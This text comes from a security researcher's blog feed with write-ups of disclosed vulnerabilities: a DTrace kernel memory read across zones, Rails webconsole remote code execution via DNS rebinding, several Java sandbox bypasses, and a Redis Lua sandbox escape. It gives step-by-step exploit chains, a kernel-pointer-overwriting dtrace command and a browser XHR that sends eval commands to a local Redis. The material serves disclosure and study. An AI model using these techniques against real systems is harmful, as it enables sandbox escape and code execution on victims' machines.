<pre><code>[root@web01 ~]# dtrace -x dynvarsize=36 -n 'char buf[1]; BEGIN {buf[0]=0x1;hash[1,buf]="h";addr = (&amp;hash[1, buf][0]) - 0x28; *(void**)addr = &amp;`dtrace_dynhash_sink; print(&amp;hash[1,buf][0])}'

<p>Doing 256 syscalls to read 1 byte is slow but the global ps is still responsive :)</p>

<p><a href="https://github.com/benmmurphy/illumos_playground/blob/master/ZDI-16-465/global_ps3.c">POC Code on Github</a></p>

<h1>DTrace STRSTR</h1>

<p>If you look at the <a href="https://docs.oracle.com/cd/E37670_01/E38608/html/dt_strstr_actsub.html">DTrace user guide</a> it has this definition for the <code>strstr</code> function:</p>

<blockquote><p>string strstr(const char *s, const char *subs)</p><p>    strstr returns a pointer to the first occurrence of the substring subs in the string s. If s is an empty string, strstr returns a pointer to an empty string. If no match is found, strstr returns 0.</p></blockquote>


<p>The <code>dtrace_canload</code> function takes a pointer and a size for checking whether a range can be accessed. However, the <code>strstr</code> function just takes a pointer to a string. How is it possible for <code>strstr</code> to call <code>dtrace_canload</code> to check whether the string can be safely searched? The <a href="https://github.com/joyent/illumos-joyent/blob/release-20160218/usr/src/uts/common/dtrace/dtrace.c#L4257">original implementation</a> only checked <code>dtrace_canload</code> after the string had been searched.</p>

<pre><code>case DIF_SUBR_STRRCHR: {
  /*
   * We're going to iterate over the string looking for the
   * specified character.  We will iterate until we have reached
   * the string length or we have found the character.  If this
   * is DIF_SUBR_STRRCHR, we will look for the last occurrence
   * of the specified character instead of the first.
   */
  uintptr_t saddr = tupregs[0].dttk_value;
  uintptr_t addr = tupregs[0].dttk_value;
  uintptr_t limit = addr + state-&gt;dts_options[DTRACEOPT_STRSIZE];
  char c, target = (char)tupregs[1].dttk_value;

  for (regs[rd] = NULL; addr &lt; limit; addr++) {
    if ((c = dtrace_load8(addr)) == target) {
      regs[rd] = addr;

      if (subr == DIF_SUBR_STRCHR)
        break;
    }

    if (c == '\0')
      break;
  }

  if (!dtrace_canload(saddr, addr - saddr, mstate, vstate)) {
    regs[rd] = NULL;
    break;
  }

  break;
}
</code></pre>

<p>There doesn&rsquo;t seem to be any way to observe the result in <code>regs[rd]</code> before it is clobbered when <code>dtrace_canload</code> fails. All of this data is only visible to the current thread and not accessible globally. However, Illumos provides access to the hardware performance counters and allows you to set them to trace while in the kernel only.</p>

<p>It is possible to set <code>DTRACEOPT_STRSIZE</code> to an arbitrary value. So if strsize
is set to 1 then only one byte will be checked against the search value supplied
to the strchr function. This effectively means the strchr function is checking
if the byte at an address is a specific value. The number of instructions or branches taken will be different depending on whether the byte at the address is null, the byte at the address matches or the byte at the address is different.</p>

<p>If we set the performance counter
to be PAPI_br_ins (Branch instructions taken) on my machine it will take 645
for a correct value and 646 for an incorrect value. Also, it will always take
645 for a zero value. So by iterating through the byte values (1-255) and
calling strchr on each it is possible to read an arbitrary byte.</p>

<p>There is some noise which I suspect is caused by paging which can cause higher
values but if you discard any result that does not match 646 or 645 and try
again then this works out.</p>

<p>There is also a weird extra branch taken for some addresses. I believe this is because of the toxic range check. The toxic range check is done by <code>addr &gt; START &amp;&amp; addr &lt; END</code> so depending on whether <code>addr &gt; START</code> or not there will be a difference in the number of branches taken. (We ignore <code>addr</code> &lt; END` because we don&rsquo;t try to read from toxic ranges.) This read is not ambiguous because the extra branch translates to
either every byte not matching (all 646) or one byte not matching (646) and
all the other bytes having an unknown result (647).</p>

<p>Again we plug this vulnerability into our exploit framework and dump memory from arbitrary processes in other zones. :)</p>

    <link href="http://benmmurphy.github.com/blog/2016/07/11/rails-webconsole-dns-rebinding/"/>
    <updated>2016-07-11T09:00:00+01:00</updated>
    <id>http://benmmurphy.github.com/blog/2016/07/11/rails-webconsole-dns-rebinding</id>
    <content type="html"><![CDATA[<p>The webconsole gem which ships with the Rails development server allows remote code execution via DNS Rebinding. I reported this issue to Rails on April 20th 2015. However, it may have been reported to them earlier because Homakov also found the issue independently and tweeted about it here:</p>

<div class='embed tweet'><blockquote class="twitter-tweet"><p lang="en" dir="ltr">There are lots of dangerous interactions with localhost: I tweeted that with DNS rebinding we can RCE via REPL on any Rails app, no fix yet</p>&mdash; Egor Homakov (@homakov) <a href="https://twitter.com/homakov/status/686670899081273346">January 11, 2016</a></blockquote>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script></div>


<p>Since this issue is semi-public I think it is better that the problem is made public before waiting for a fix that may never appear. It also important to note that many developer set ups are probably not vulnerable because they are using Pow to run Rails applications or their upstream DNS servers apply DNS rebinding protection.</p>

<p>The problem is same origin policy in browsers is broken for IP based security unless the server checks the Host header is what it expects it to be. And it looks like rails development mode does not do any checking of the Host header to see that the header is 127.0.0.1 or localhost.</p>

<p>The attack looks something like this:</p>

<ol>
<li>Attacker tricks user into going to a website they control. For example reallycoolflashgame.com (nothing looks suspicious..)</li>
<li>Attacker opens an iframe to sdjhskdf87.reallycoolflashgame.com:3000 (SOP policy is based on the port number and we open this in an iframe so we don&rsquo;t tip off the user that something suspicious is going on)</li>
<li>sdjhskdf87.reallycoolflashgame.com is a DNS record with a really short TTL. For example 60 seconds. Attacker then changes the DNS record to point from their IP address to 127.0.0.1</li>
<li>The original html page at sdjhskdf87.reallycoolflashgame.com:3000 starts making XHR requests after the TTL has expired. These requests get routed to the rails app and they can trigger the debug functionality remotely.</li>
</ol>


<p>I have a website that simulates this attack. If you visit this website on OSX and it starts the Calculator.app then you are definitely vulnerable. However, if it does not work then that might be because the attack is buggy and is not proof that you don&rsquo;t have a vulnerable setup.</p>

<ol>
<li>create a new rails project with rails new demo</li>
<li>cd demo; rails server</li>
<li>go to <a href="http://www.dnsrebinder.net/">http://www.dnsrebinder.net/</a> in your browser</li>
<li>You will have to wait about 60-80 seconds and if you are running OSX it will pop a calculator. If you are running something else it won&rsquo;t do anything useful :(. You can monitor what is happening in Chrome Developer tools. If you see a request that generates a 404 this is evidence that the DNS rebinding was successful.</li>
</ol>


<p>It might not work if your router or upstream DNS provider is filtering private ip ranges in DNS lookups. So you might have to set your DNS server to point to 8.8.8.8 (google DNS).</p>

<h2>Mitigations</h2>

<ol>
<li>Remove webconsole gem from your Gemfile.</li>
<li>Use pow.cx which hosts your Rails application under the .dev domain namespace and do not spawn Rails applications using the &lsquo;rails server&rsquo; command.</li>
<li>Use a DNS server that applies DNS rebinding filtering. It is important that it filters 127.0.0.0/8 and the IPV6 local addresses. In particular Rails5 Puma only binds to the IPV6 local address under OSX.</li>
</ol>


<h2>Update</h2>

<p>The same vulnerability effect the <a href="https://github.com/charliesome/better_errors">better errors gem</a>. Thanks to <a href="https://twitter.com/mikeycgto">@mikeycgto</a> for the pointer.</p>

    <link href="http://benmmurphy.github.com/blog/2015/11/09/zdi-13-XXX-java-sandbox-bypass-1-dot-7-0-10-slash-1-dot-6-0-38-via-proxy-and-jmx/"/>

    <content type="html"><![CDATA[<p>This is part of a series of posts detailing Java Sandbox Bypasses that were disclosed
between 2012-2013. You can view the other bugs by going back to the <a href="http://benmmurphy.github.com/blog/2015/10/21/zdi-13-075-2013-java-1-dot-7-0-09-sandbox-bypass">original post</a>.</p>

<p>The last two vulnerabilities I wrote up ( <a href="http://benmmurphy.github.com/blog/2015/10/23/zdi-13-246-2013-java-1-dot-7-0-15-sandbox-bypass-via-objectoutputstream">ZDI-13-246</a>, <a href="http://benmmurphy.github.com/blog/2015/10/21/zdi-13-075-2013-java-1-dot-7-0-09-sandbox-bypass">ZDI-13-075</a>) involved heap spraying so were not 100% reliable. Most of my sandbox bypasses against the JVM did not use memory corruption or heap spraying so were 100% reliable. These reliable sandbox bypasses fell into two main categories:</p>

<p>First there were vulnerabilites that would try to create a chain from privileged code to a &lsquo;dangerous&rsquo; function without touching any user frames. Java uses stack walking to decide whether a dangerous function (<code>System.setSecurityManager(null)</code>, <code>Runtime.execute</code>) is allowed to proceed so if you could create a chain then you could subvert the protection.</p>

<p>Second there were vulnerabilities that got access to methods in the &lsquo;protected packages&rsquo;. After getting access to these packages it is usually trivial to escalate out of the sandbox because it is assumed user code cannot access these methods. Access to these packages usually involved abusing reflection or parts of the JDK that used reflection but did not do so securely. This vulnerability which has existed at least since Java 5 is a good example of abusing reflection to access privileged packages.</p>

<p>This bug is interesting because there is no ZDI public disclosure for it. I suspect this is because <a href="http://www.security-explorations.com/en/about.html">Adam Gowdiak</a> disclosed it to Oracle first. Looking back I also suspect I may have sniped this vulnerability from Adam Gowdiak. Gowdiak seems to have a habit of partially publicly disclosing Java bugs before they are fixed. Another bug I disclosed to ZDI, ZDI-13-079 was based on a post he made to the full disclosure mailing list and I definitely sniped this bug from him. I can&rsquo;t remember the exact details about how I found this bug but I remember Gowdiak made a <a href="http://www.security-explorations.com/materials/se-2012-01-devoxx.pdf">presentation</a> where he said &lsquo;com.sun.xml.internal.bind.v2.model.nav.Navigator&rsquo; was an interesting class. It is possible that I was able to reverse the underlying bug from this.</p>

<h2>Vulnerabilies</h2>

<p>Three vulnerabilities are used to bypass the sandbox.</p>

<ol>
<li>Accessing Class instances in protected packages.</li>
<li>Reading fields on interfaces in protected packages.</li>
<li>Getting access to <code>java.lang.reflect.Method</code> for interface methods in
protected packages.</li>
</ol>


<h2>Loading Classes in Protected Packages</h2>

<p>The JmxMBeanServer class allows you to load classes from protected packages.
This isn&rsquo;t possible in Java 6.</p>

<pre><code>server = JmxMBeanServer.newMBeanServer("", null, null, true);
server.getMBeanInstantiator().findClass(className, (ClassLoader)null);
</code></pre>

<p>findClass in MBeanInstantiator ends up calling <code>loadClass(className, null)</code>
which will end up performing <code>Class.forName(className)</code>.</p>

<h2>Reading Fields on Interfaces in Protected Packages</h2>

<p>If you call <code>Proxy.getProxyClass(null, new Class[]{targetClass})</code> then the
generated proxy class will have all the fields from the targetClass. Because
the generated proxy class is not in a protected package user code can then call
<code>proxyClass.getFields()</code> which will give back the <code>java.lang.reflect.Field</code> object
and because the field is public call <code>Field#get</code> will succeed. The proxy class
successfully loads because it is defined the root class loader.</p>

<h2>Getting Access to Method objects for Interface Methods in Protected Packages</h2>

<p>This uses a similar vulnerability as above. You can think of the Proxy instance
as a machine that will convert Method objects into Method objects for a
particular interface. If you look at <code>proxyClass.getDeclaredMethods()</code> for
<code>com.sun.xml.internal.bind.v2.model.nav.Navigator</code> you will see something like:</p>

<pre><code>public final boolean $Proxy0.isFinal(java.lang.Object)
public final boolean $Proxy0.isArray(java.lang.Object)
..
</code></pre>

<p>If you call <code>$Proxy0.isFinal(java.lang.Object)</code> then it will convert this Method
into <code>Navigator.isFinal(java.lang.Object)</code> before passing it to the
<code>InvocationHandler</code>.</p>

<p>To access a <code>Method</code> on an interface in a protected package all you have to do is
create an <code>InvocationHandler</code> that will save the Method then invoke the
corresponding public method on the proxy class.</p>

<p>Once an attacker has access to the Method then they are free to invoke it
because the <code>Method</code> is public and no more access checks are performed.</p>

<h2>Exploit</h2>

<ol>
<li>We use the JMX class loading vulnerability to load the class
<code>"com.sun.xml.internal.bind.v2.model.nav.Navigator"</code>.</li>
<li>We then use the field reading vulnerability to read the <code>REFLECTION</code> field from
the interface.</li>
<li>We then use the interface method vulnerability to read the
<code>getDeclaredMethods(Object o)</code> method from the <code>Navigator</code> class.</li>
</ol>


<p>Now that we have a way of getting Methods from a protected Class
(<code>getDeclaredMethods</code>) and a way of loading protected classes (JMX vulnerability)
we can easily subvert the JVM sandbox. There is probably 100 ways of doing this
because once you can execute arbitrary static methods in the protected packages
it is game over for the JVM. We will use a technique similar to the one
disclosed in ZDI-13-159 in order to disable the sandbox except we will modify
it slightly so it only uses JDK 6 classes.</p>

<ol>
<li>We use <code>com.sun.xml.internal.bind.v2.ClassFactory#create(Class)</code> to create a
<code>sun.reflect.ReflectionFactory$GetReflectionFactoryAction</code></li>
<li>We use <code>com.sun.xml.internal.ws.api.server.InstanceResolver#createSingleton</code> to
create an <code>InstanceResolver</code> object</li>
<li>We use <code>com.sun.xml.internal.ws.api.server.InstanceResolver#createInvoker</code> to
create an <code>Invoker</code> object</li>
<li>We use <code>com.sun.xml.internal.ws.api.server.Invoker#invoke</code> to invoke
<code>AccessController#doPrivileged</code> with the <code>PrivilegedAction</code> in step 1 to create a
<code>ReflectionFactory</code> object.</li>
<li>We invoke <code>sun.reflect.ReflectionFactory#newField</code> with parameters that
correspond to the <code>Statement#acc</code> field</li>
<li>We invoke <code>sun.reflect.ReflectionFactory#newFieldAccessor</code> with the new field
object.</li>
<li>We create a <code>Statement</code> object that executes <code>System.setSecurityManager(null)</code>;</li>
<li>We invoke <code>sun.reflect.FieldAccessor#set(Object, Object)</code> with a <code>Statement</code>
object we have created and a <code>AccessControlContext</code> that gives us all permissions</li>
<li>We execute the <code>Statement</code> which disables the JVM security.</li>
</ol>


<h2>Exploit Java 6</h2>

<p>We use the same technique as above but we use the XSLT class loading hack
disclosed in ZDI-13-159 to load the classes because this works in Java 6.</p>

<h2>Testing (Java 7)</h2>

<p>The POC is available from <a href="https://github.com/benmmurphy/JavaPlayground/tree/master/ZDI-13-XXX/proxy_abuse7">Github</a></p>

<p>java -Djava.security.manager ProxyAbuse
or
appletviewer test.html</p>

<p>It will try and print the users home directory and execute an apple script that
will say some stuff.</p>

<h2>Testing (Java 6)</h2>

<p>The POC is available from <a href="https://github.com/benmmurphy/JavaPlayground/tree/master/ZDI-13-XXX/proxy_abuse6">Github</a></p>

<p>java -Djava.security.manager Harness
or
appletviewer test.html</p>

<p>It will try and print the users home directory and execute an apple script that
will say some stuff.</p>

<h2>Fixes</h2>

<p>User code probably shouldn&rsquo;t be able to load Proxy Classes in the bootstrap
class loader.</p>

    <content type="html"><![CDATA[<p>This is part of a series of posts detailing Java Sandbox Bypasses that were disclosed
between 2012-2013. You can view the other bugs by going back to the <a href="http://benmmurphy.github.com/blog/2015/10/21/zdi-13-075-2013-java-1-dot-7-0-09-sandbox-bypass">original post</a>.</p>

<p>This is my favourite bug because it takes two read primitives (no memory corruption) and converts them into a full sandbox bypass. The primitives are read some memory as an integer and read some memory as an object reference. This lets us find out the address of a Class object and ultimately build up a fake object that we can read.</p>

<p>It also shows how difficult it is to protect the JVM against hostile code because hostile code is able to create arbitrary threads and generate data races. This particular data race would probably be between 1 or 2 instructions if the JIT was active so it shows that any data race no matter how narrow should be exploitable on the JVM. This is made easier by the fact that as an attacker you can control a lot of the JVM options. For example you can force the JVM to run in interpreted mode which gives you a larger instruction window to race against. Also, you can tweak the GC options and have a lot of control over the heap size which helps with reliability of the heap spray used in this exploit.</p>

<p>We also see that a helpful maintainer has left a comment pointing out the vulnerability :)</p>

<p>This is a full sandbox bypass for Java 6 and Java 7. I&rsquo;ve tested it on
Java 1.7.0_15 and Java 1.6.0_38 on a single core 64 bit machine. The
exploit will only work against 64 bit compressed oops memory architecture and
32 bit memory architecture. It will not work against normal 64 bit architecture.
By default java after 1.6.0_23 will use compressed oops on a 64 bit machine.</p>

<h2>Vulnerability</h2>

<p>This exploits a data race between reading the current serialized object and
the description for the current serialized object in the ObjectOutputStream
class. When in a writeObject method an attacker can call writeObject on the
ObjectOutputStream on a different thread which will change the current
serialized context. It is possible for the following order to happen:</p>

<pre><code>/* Thread 1: gets old object */
defaultWriteObject (435): curObj = curContext.getObj();

/* Thread 2: writes new object and object description */
writeSerialData (1478):  curContext = new SerialCallbackContext(obj, slotDesc);

/* Thread 1: gets new object description -oh noes- */
defaultWriteObject (436): curDesc = curContext.getDesc();
</code></pre>

<p>You have to run the particular call pattern thousands and thousands of times
to get lucky enough for this to happen. But it can happen :)</p>

<p>And in the #defaultWriteFields method we also have a &lsquo;REMIND&rsquo; comment
asking whether we should do the isInstance check which I believe would fix this
exploit. In ObjectInputStream there is an isInstance check which prevents a
similar exploit working for the ObjectInputStream. Which is kind of annoying
because being able to do arbitrary writes in the JVM is more fun than being able
to arbitrary reads.</p>

<p>This mismatch between the object and the object descriptor is a problem because
the ObjectStreamClass uses the Unsafe class to read values from memory. This
is fine when that descriptor and object match but when they don&rsquo;t match the JVM
can be tricked into interpreting object references as integer values or integer
values as object references :)</p>

<p>We spawn a Thread that will perform a writeObject call with an instance of the
target class we want the original class to be reinterpreted as.</p>

<p>This class will also implement the writeObject method and will use it wait
until the origin object has completed its defaultWriteObject() call before
returning. This ensures the new context will be available for the original
object. Otherwise, the new context might be removed before the original object
has a chance to use it. It will look something like this:</p>

<p>The first thing we need to do is find the class word. To do this we create
an EatMe class which doesn&rsquo;t have any fields but using the race condition we
will try and make it look like the ClassCatcher class which has 40 int fields
in it. We then spray the heap with a bunch of FakeMe classes. Hopefully, the JVM
will read off the end of the ClassCatcher class and into the memory of the
FakeMe class. If it serializes a bit of the FakeMe class then the serialized
data is going to look like:</p>

<pre><code>[Some Crap] [Class Header] [Class Word] 0xDEADBEEF [Some Crap]
</code></pre>

<p>We can just search for DEADBEEF in the serialized data and if it is there then
we have recovered the Class word.</p>

<p>The next thing we need is an address of a ClassLoader object and the address
of an object that we can point inside of and re-interpret as a FakeMe object.
For the re-interpeting object I chose an array of int. We store the ClassLoader
and array of int in the ObjectHolder object and use the race condition to
reinterpret it as a ShadowInt class. The ShadowInt object&rsquo;s fields are integers
that allow us to read the address of the fields in the ObjectHolder object.</p>

<p>Now we have the addresses of the array of int and a classloader object we can
create our fake object.</p>

<p>The JVM memory layout of an array of int looks something like this:</p>

<pre><code>-----------------------------------------------------------
| Header 4/8 bytes depending on 32bit/64bit               |
----------------------------------------------------------|
| Class word 4/8 bytes depending on 32bit,64bit-oops/64bit|
-----------------------------------------------------------
| Length 4 bytes                                          |
-----------------------------------------------------------
| Int at index 0 (4 bytes)                                |
-----------------------------------------------------------
| Int at index 1 (4 bytes)                                |
-----------------------------------------------------------
| Int at index 2 (4 bytes)                                |
-----------------------------------------------------------
| Int at index 3 (4 bytes)                                |
-----------------------------------------------------------
| etc..                                                   |
-----------------------------------------------------------
</code></pre>

<p>So on 64 bit with compressed pointers we store the object header in the first
two integers, the class word in the third integer and the reference to the class
loader in the fourth integer. It will look something like this:</p>

<pre><code>-----------------------------------------------------------
| Header 4/8 bytes depending on 32bit/64bit               |
----------------------------------------------------------|
| Class word 4/8 bytes depending on 32bit,64bit-oops/64bit|
-----------------------------------------------------------
| Length 4 bytes                                          |
-----------------------------------------------------------
| Object Header Part 1                                    |
-----------------------------------------------------------
| Object Header Part 2                                    |
-----------------------------------------------------------
| FakeMe Class Word                                       |
-----------------------------------------------------------
| Reference to ClassLoader                                |
-----------------------------------------------------------
</code></pre>

<p>The address of this fake object will be 16 bytes following the address of the
array on 64 bit with compressed pointers. However, when we store this address
somewhere we need to convert it to a compressed pointer. This is done by using
an offset of 2 from the address of the array (which is already a compressed
pointer) instead of 16 because compressed pointers effectively multiply the
address by 8. Very strangely on Linux and windows compressed oops don&rsquo;t appear
to be compressed and an offset of 16 instead of 2 needs to be used. I only see
properly compressed oops under OSX [1].</p>

<p>Finally we use the IntHolder object to store the address of the fake object and
use the race condition to re-inerpret it as a ShadowObject. The ShadowObject has
a single object field so the address originally stored as an integer will be
interpreted as an object reference. The ObjectOutputStream will then try to
serialize it and FakeMe implements the writeObject method so it will be able to
use the ClassLoader reference to define an Evil class with AllPermission which
will disable the JVM sandbox. The source code for the Evil class is in Evil.java</p>

<h2>Testing</h2>

<pre><code>java -Xint -XX:+UseSerialGC -Xms256m -Xmx256m -Xnoclassgc -Djava.security.manager Ser2
</code></pre>

<p>or
    appletviewer -J-Xint -J-XX:+UseSerialGC -J-Xms256m -J-Xmx256m -J-Xnoclassgc test.html</p>

<p>command line appletviewer needs -Xint and other parameters because it ignores
the jvm args applet parameter. firefox and ie both correctly handles the
-Xint and other parameters.</p>

<p><a href="http://docs.oracle.com/javase/6/docs/technotes/guides/jweb/applet/applet_deployment.html">Applet Deployment Parameters</a></p>

<p>If the exploit works you will get output like this:</p>

<p>This exploits depends on a race condition that may be difficult to reproduce. We
force the applet to run in interpreted mode to increase the chance of running
into the race condition.</p>

<p>This exploit depends on the memory layout of the JVM and is not as reliable as
other exploits. It also appears that the compressed OOP format is different on
Windows and Linux when compared to OSX [1]. The exploit will try to determine what
format it should put the compressed OOPs in but it could guess wrong in which
case the exploit is likely to crash or just not work.</p>

<p>The exploit will try and print out user.home and run an apple script that will
say some stuff and run calc.exe.</p>

<p>(1): So for compressed OOPS and small heaps &lt; 4GB (maybe it needs to be smaller) you don&rsquo;t need to perform a shift so apparently on Linux and Windows JVM the shift was skipped but on OSX the shift was still being performed.</p>

<p>I&rsquo;m going to try and publish the more interesting ones first. I find this one involving ConcurrentHashMap
interesting because it shows how difficult Java security is to get correct. The bug was introduced by Doug Lea and
the commit introducing the bug was also reviewed by another person. If Doug Lea can&rsquo;t write secure code what hope
is for us mere mortals.</p>

<p>This bug also illustrates exploiting memory corruption by heap spraying in Java and methods to increase the reliability
of a heap spray. Most of the vulnerabilities I found in Java did not involve heap corruption so were much more reliable.</p>

<h2>Vulnerability</h2>

<p>In Java 7 java.util.concurrent.ConcurrentHashMap was changed to make it go faster (?) by replacing array accesses like segments[x] to UNSAFE.getObjectVolatile(segments, SBASE + x &lt;&lt; SHIFT).</p>

<p>This is the changeset from jdk source control that explains the change:</p>

<p>The (hash >>> segmentShift) &amp; segmentMask line ensures that the offset into the array is valid. Both of these values are final fields and are initialized in the constructor to the correct values. Unfortunately, this class is Serializable and the readObject method does s.defaultReadObject() and does no checking of these fields. This means an attacker can set these two values to whatever he wants. For example he can set segmentShift to 0 and segmentMask to 0xFFFFFFFF and then the value of hash will be unchanged by the (hash >>> segmentShift) &amp; segmentMask operation. if the value of hash is larger than the array then the JDK will try to do a memory write past the array.</p>

<h2>POC Code</h2>

<p>The POC code is available from <a href="https://github.com/benmmurphy/JavaPlayground/blob/master/ZDI-13-075/CHM.java">Github</a>.</p>

<p>In the attack we create a serialized ConcurrentHashMap with segmentShift set to 0 and segmentMask set to 0x40000. The idea behind using 0x40000 is so the calculated offset will either be 0 or 262144. When the offset is 0 the hash map works correctly and doesn&rsquo;t do anything weird. When the value is 262144 it will write past the end of the segments array and hopefully it will write where we want it to write. The class Make is used to generate the byte array for this object as well as the byte array for the Evil class I will cover later on.</p>

<p>Next we deserialize this object in the sandboxed class. We then run a gc cycle and sleep. This massively improves the chance of the exploit succeeding. I suspect this is because the array that I allocate to catch the write is more likely to appear after the ConcurrentHashMap in memory and also more likely to be closer to the ConcurrentHashMap in memory. If the segs array is > (262144 * bytes) bytes away in memory from the segments array in the concurrent hash map object then the exploit will fail and probably crash when it tries to read an object and it is not properly aligned. The exploit will also fail if the segs array is located before the ConcurrentHashMap&rsquo;s segment array in memory.</p>

<p>Next we allocate a big array of Segs to try to catch the write that ConcurrentHashMap does. The Seg class has the exact same structure as ConcurrentHashMap.Segment does. It also contains a HEntry class which has the exact same structure as ConcurrentHashMap.HashEntry. One major difference is HEntry value field is typed EvilClassLoader while ConcurrentHashMap.HashEntry value field is typed Object.</p>

<p>Next we call on the put method on ConcurrentHashMap. This will hopefully either write to the 0th segment in ConcurrentHashMap or write into our array of Segs.</p>

<p>As the value to the put call we use a ClassLoader object. The hope is that will end up with a HEntry object that has a value filled in with a ClassLoader object but which is typed EvilClassLoader. Our EvilClassLoader object has a static method which can be used to define classes with arbitrary protection domains. Normally the JVM will not let you create an EvilClassLoader object because it can subvert the sandbox. There is a check in the ClassLoader&rsquo;s constructor to prevent you from doing this. But if the JVM gets confused about types because of a naughty UNSAFE.putObjectVolatile then we can trick the JVM into believing a ClassLoader is really an EvilClassLoader and we can call our evil methods on the ClassLoader instance.</p>

<p>If we can get an object typed EvilClassLoader then it is game over because we can load the Evil class which has a method &lsquo;disable&rsquo; which disables the security manager. The disable method will succeed because it does AccessController.doPrivileged and it has the AllPermission we added using the EvilClassLoader&rsquo;s defineClass method.</p>

<p>We repeat the calls to the put method with different String values because the jvm hashing algorithm is randomized and we can get unlucky and repeatedly get offset values of 0. I believe at the time Java was using Murmur/Murmur2 + mixed in secret key in order to protect against HashDoS and it was easier to just keep generating different strings than to try and reverse the secret key.</p>

<h2>Testing</h2>

<pre><code>java -Djava.security.manager CHM
</code></pre>

<p>or</p>

<pre><code>appletviewer test.html
</code></pre>

<p>It will print out &ldquo;user.home&rdquo; system property and try to run calc.exe</p>

<p>I&rsquo;ve tested this with latest jdk 1.7.0_09 on windows 7 and mac osx. If you have trouble getting it working segmentMask in Make.java (need to copy bytes to INPUT field in CHM.java after making change) and the size of segs array in CHM.java can be tweaked.</p>

    <content type="html"><![CDATA[<div class='embed tweet'><blockquote class="twitter-tweet"><p lang="en" dir="ltr">If we can use the Redis Lua scripting vulnerability to hot-patch it, the circle is closed and I can change business.</p>&mdash; Salvatore Sanfilippo (@antirez) <a href="https://twitter.com/antirez/status/606440338102689792">June 4, 2015</a></blockquote>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script></div>


<p>The arbitrary read and arbitrary write from the <a href="https://gist.github.com/corsix/6575486">Lua vulnerability</a> makes it quite easy to patch the vulnerability itself. I have written a proof of concept that should work on OSX Yosemite with any of the Homebrew bottled Redis versions that are vulnerable. It should also work on Mavericks and other compiled versions of Redis but I have not tested it on them (on versions other than Yosemite it may crash if the format of the long jump buffer is not the same). The Hot Patcher looks for the instruction <a href="https://github.com/antirez/redis/commit/fdf9d455098f54f7666c702ae464e6ea21e25411#diff-9486950b94262375ea8951aecc31b93cL498">cmp r15, 0x1b</a> and replaces it with &lsquo;cmpq rsp,0x1b&rsquo;. This comparison should never be true because the stack typically lives around 0x7fxxxxxxxxxxxxxx and will never reach such a low address. However, looking for this exact instruction makes the patcher quite brittle and it may not work on Redis versions compiled with different compilers.</p>

<p>The Hot Patcher proof of concept uses the CSRF technique to run so you can run it directly from your browser. However, before running it you should understand:</p>

<ul>
<li>it may crash your Redis server and you may lose your data (i think the exploit used to crash when the shellcode was allocated across two pages and i was only mprotect'ing the bottom page. but if this wasn&rsquo;t the cause of the crash then the exploit is still flakey. or there could still be bugs.)</li>
<li>it might not crash your Redis server but may silently corrupt the data in your Redis server</li>
<li>you MUST own the Redis server running on 127.0.0.1:6379</li>
<li>this is not a full fix for the Lua sandbox bypass and only disables the loading of bytecode</li>
<li>it does not permanently patch Redis and the patch will be reverted after a restart</li>
<li>it is probably better to write a script for GDB to do the live patching. But I don&rsquo;t understand GDB scripting :(</li>
</ul>

<p>It is best to run the Redis server from your terminal then you can see the output from the patcher. It should look something like:</p>

<p>You can test if the patcher worked by running the following from redis-cli:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>eval "return tostring(loadstring(string.dump(function() end)))" 0</span></code></pre></td></tr></table></div></figure>


<p>If you are vulnerable it will return:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>"function: 0x7fdcd8439df0"</span></code></pre></td></tr></table></div></figure>


<p>If the patch has been applied it will return:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>"nil"</span></code></pre></td></tr></table></div></figure>


<p>Here is the lua code for the patcher:</p>

    <link href="http://benmmurphy.github.com/blog/2015/06/04/redis-eval-lua-sandbox-escape/"/>
    <updated>2015-06-04T09:52:00+01:00</updated>
    <id>http://benmmurphy.github.com/blog/2015/06/04/redis-eval-lua-sandbox-escape</id>
    <content type="html"><![CDATA[<p>It is possible to break out of the Lua sandbox in Redis and execute arbitrary
code. This vulnerability is not new and is heavily based on
<a href="https://www.youtube.com/watch?v=OSMOTDLrBCQ">Peter Cawley&rsquo;s work</a> with Lua bytecode
<a href="https://gist.github.com/corsix/6575486">type confusion</a>.</p>

<p>This shouldn&rsquo;t pose a threat to users under the trusted Redis security model
where only trusted users can connect to the database. However, in real
deployments there could be databases that can be accessed by untrusted users.
The main deployments that are vulnerable are developers machines, places where
redis servers can be reached via SSRF attacks and cloud hosting.</p>

<p><a href="https://groups.google.com/forum/#!msg/redis-db/4Y6OqK8gEyk/Dg-5cejl-eUJ">Redis 2.8.21 and 3.0.2</a> have been released to fix this issue.</p>

<h1>Vulnerable Deployments</h1>

<h2>Developers Machines</h2>

<p>Developers machines may be vulnerable because they bind Redis to all interfaces
which used to be the default listen directive in the Redis configuration.</p>

<p>Developers may also be vulnerable even if they bind to 127.0.0.1 because Redis
is effectively a HTTP server. The first mention of attacking Redis via HTTP I
could find is by <a href="http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html">Nicolas Grégoire</a>
where he documents attacking a Redis server on a Facebook property using a SSRF
vulnerability.</p>

<p>Because Redis is a HTTP server the same origin policies of browsers will allow
any website on the internet to send a POST request to it. When using XHR the
body is completely controllable. For example if you run the following in the
console of your webbrowser while running wireshark:</p>

<pre><code>var x = new XMLHttpRequest();
x.open("POST", "http://127.0.0.1:6379");
x.send('eval "print(\\"hello\\")" 0\r\n');
</code></pre>

<p>In wireshark you will see:</p>

<pre><code>POST / HTTP/1.1
Host: 127.0.0.1:6379
Connection: keep-alive
Content-Length: 27
Pragma: no-cache
Cache-Control: no-cache
Origin: http://www.agarri.fr
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Referer: http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8

eval "print(\"hello\")" 0
-ERR unknown command 'POST'
-ERR unknown command 'Host:'
-ERR unknown command 'Connection:'
